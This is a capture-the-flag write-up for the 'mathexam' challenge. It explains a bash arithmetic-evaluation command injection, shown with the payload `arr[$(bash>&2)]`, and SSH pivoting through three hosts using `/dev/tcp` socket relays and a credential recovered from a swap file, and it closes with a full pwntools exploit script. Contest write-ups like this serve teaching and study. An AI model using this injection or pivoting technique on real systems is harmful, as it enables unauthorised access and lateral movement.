# mathexam

## Overview

mathexam was a 4 part problem focusing on the bash shell. Initially, we
are given a bash shell script implementing a math guessing game. We are
allowed to connect over an HTTP proxy to an instance of the problem
running thie script.

## Part 1

The bash script requires the user to enter an "exam integrity
statement", asks the the user 100 addition questions, checking the
answers, prints a score, then exits.

The bug lies in the following code:
```bash
    read line

    if [[ "$line" -eq "$ans" ]]
    then
        ...
    fi
```

While this appears safe at first glance, this actually allows command
injection because bash performs arithmetic evaluation on the arguments
to `-eq`, as described at
https://research.nccgroup.com/2020/05/12/shell-arithmetic-expansion-and-evaluation-abuse/.

Providing `arr[$(bash>&2)]` to that prompt gives us a shell that allows
us to read the first flag.

## Part 2

Looking around the filesystem, we see a file named `.connect.sh.swp`
that contains a reference to the command
`sshpass -p x5kdkwjr8exi2bf70y8g80bggd2nuepf ssh ctf@second`.

From this, we conclude that we need to proxy an SSH connection to
`second` using those credentials via bash.

We did this by opening a socket in bash using:
`exec 5<> /dev/tcp/second/22` then redirecting stdin and stdout to/from
the socket using `cat <&5 & cat >&5`.

Then we used pwntool's `pwnlib.tubes.ssh` to take over our remote connection
and speak SSH to it. This gives us a shell that allows us to read the
second flag.

## Part 3

Part 3 was the same as part 2, except this time, we need to connect to
`ctf@third`. The SSH server on `second` does not allow port forwarding
so we bash to proxy the connection in the same way.

## Part 4

Part 4 was the same as parts 2 and 3, except that `cat` is no longer
available in this shell. We initially attempted to replicate `cat` using
a bash read loop. However, this appeared to corrupt inputs/outputs
somehow. After debugging this for a bit, we realized that bash's read
builtin is unable to return null bytes. Searching for solutions to this
online, we found
https://unix.stackexchange.com/questions/626641/how-to-read-binary-data-including-zero-bytes-using-bash-builtin-read
and adapted the solution from there (see our solution script below).

Replacing `cat` with a null-preserving read loop allows us to SSH to
`ctf@fourth`, which gives us the final flag.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

l = listen()
l.spawn_process('socat - PROXY:instance.0ctf2023.ctf.0ops.sjtu.cn:7et9q47wqqhqqc6b:1,proxyport=18081'.split())

r = remote('localhost', l.lport)

r.recvuntil(b'here:\n')
r.sendline(b'I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment')
r.recvuntil(b'?\n')
r.sendline(b'arr[$(bash>&2)]')
r.sendline(b'cat .connect.sh.swp; echo EOF')
swp = r.recvuntil(b'EOF\n', drop=True)

password = swp.split(b' -p ')[1].split()[0].decode()
print(f'{password = }')

r.sendline(b'exec 5<> /dev/tcp/second/22; cat <&5 & cat >&5')

s = ssh(user='ctf', password=password, host='second', proxy_sock=r.sock, raw=True)
r2 = s.shell(tty=False)

r2.sendline(b'exec 5<> /dev/tcp/third/22; cat <&5 & cat >&5')

s2 = ssh(user='ctf', password=password, host='third', proxy_sock=r2.sock, raw=True)
r3 = s2.shell(tty=False)

r3.sendline(b'''
exec 5<> /dev/tcp/fourth/22;
while IFS= LC_ALL=C read -rd '' -n1 c && [[ -z "$c" ]] && printf '\\0' || echo -n "$c"; do true; done <&5 &
while IFS= LC_ALL=C read -rd '' -n1 c && [[ -z "$c" ]] && printf '\\0' || echo -n "$c"; do true; done >&5
'''.strip())

s3 = ssh(user='ctf', password=password, host='fourth', proxy_sock=r3.sock, raw=True)
s3.interactive()
```

